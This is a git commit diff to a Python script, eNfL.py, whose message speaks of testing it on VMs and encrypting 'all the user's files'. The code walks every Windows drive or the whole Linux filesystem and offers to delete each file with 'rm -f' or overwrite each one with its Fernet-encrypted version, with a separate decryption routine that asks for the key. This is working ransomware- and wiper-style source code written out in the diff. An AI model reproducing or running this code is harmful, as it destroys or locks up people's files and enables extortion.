0c62cd844677daa677fa57738e6fae6557da20b2
n0rbed <58118886+n0rbed@users.noreply.github.com>
2021-04-05 19:03:20 +0200

    Add files via upload
    finished the linux section, was just a lot of copying and pasting with slight edits here and there from my windows part. whats left now is to just test both on VM's to see if all of the options work, i also have to brainstorm a way to safely store the key somewhere before encrypting all the user's files.

--- eNfL.py
+++ eNfL.py
@@ -4,36 +4,39 @@ import platform
 from cryptography.fernet import Fernet
 from string import ascii_uppercase
 
-def get_windrives_filenames():
-    drives = []
-    file_paths = []
-    for drive in ascii_uppercase:
-        if os.path.exists(os.path.join(str(drive) + ":\\")):
-            drives.append(str(drive) + ":\\")
-
-    for i, drive in enumerate(drives):
-        if(drive in os.getenv('windir') and not drive == ''):
-            progf86_path = drive + 'Program Files (x86)\\' 
-            progf_path = drive + 'Program Files\\'
-            desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-
-            drives.append(progf86_path)
-            drives.append(progf_path)
-            drives.append(desktop_path)
-            drives.pop(i)
-    for drive in drives:
-        for root, _, filenames in os.walk(drive):
-            for filename in filenames:
-                file_paths.append(os.path.join(root, filename))
-    
-    return [drives, file_paths]
 
 
 if(platform.system() == 'Windows'):
+
+    def get_drives_filepaths():
+        drives = []
+        file_paths = []
+        for drive in ascii_uppercase:
+            if os.path.exists(os.path.join(str(drive) + ":\\")):
+                drives.append(str(drive) + ":\\")
+
+        for i, drive in enumerate(drives):
+            if(drive in os.getenv('windir') and not drive == ''):
+                progf86_path = drive + 'Program Files (x86)\\' 
+                progf_path = drive + 'Program Files\\'
+                desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+
+                drives.append(progf86_path)
+                drives.append(progf_path)
+                drives.append(desktop_path)
+                drives.pop(i)
+        for drive in drives:
+            for root, _, filenames in os.walk(drive):
+                for filename in filenames:
+                    file_paths.append(os.path.join(root, filename))
+        
+        return [drives, file_paths]
+
+
     print("Windows OS discovered.")
     delenc_choice = input('Delete/Encrypt/Decrypt all files? ').lower()
     sys32_path = os.path.join(os.getenv("windir"), "System32")
-    drives, file_paths = get_windrives_filenames()
+    drives, file_paths = get_drives_filepaths()
     
     if(delenc_choice == 'delete'):
         print('Starting deletion process...')
@@ -95,19 +98,61 @@ if(platform.system() == 'Windows'):
         
 
 if(platform.system() == 'Linux'):
+
+    def get_filepaths():
+        file_paths = []
+        for root, _, filenames in os.walk('/'):
+            for filename in filenames:
+                file_paths.append(os.path.join(root, filename))
+        
+        return file_paths
+
+    file_paths = get_filepaths()
+
     print('Linux OS discovered.')
     choice = input('Delete/Encrypt/Decrypt all files? ').lower()
 
     if(choice == 'delete'):
         print('Deleting all files that this user has privilages to access.')
 
+        for file in file_paths:
+            subprocess.run(['rm -f', file])
+
 
     if(choice == 'encrypt'):
         print('Encrypting all files that this user has privilages to access')
 
+        key = Fernet.generate_key()
+        keyfunc = Fernet(key)
+
+        with open('mykey.txt', 'wb') as mykey:
+            mykey.write(key)
+
+        for file in file_paths:
+            with open(file, 'rb') as original_file:
+                original = original_file.read()
+
+            encrypted_version = keyfunc.encrypt(original)
+
+            with open(file, 'wb') as original_file:
+                original_file.write(encrypted_version)
+
+
 
     if(choice == 'decrypt'):
         key = input('What is the decryption key? ')
+        keyfunc = Fernet(key)
+
+        print('Starting decyrption process...')
+
+        for file in file_paths:
+            with open(file, 'rb') as encrypted_file:
+                encrypted = encrypted_file.read()
+
+            decrypted_version = keyfunc.decrypt(encrypted)
+
+            with open(file, 'wb') as encrypted_file:
+                encrypted_file.write(decrypted_version)
     
 
 
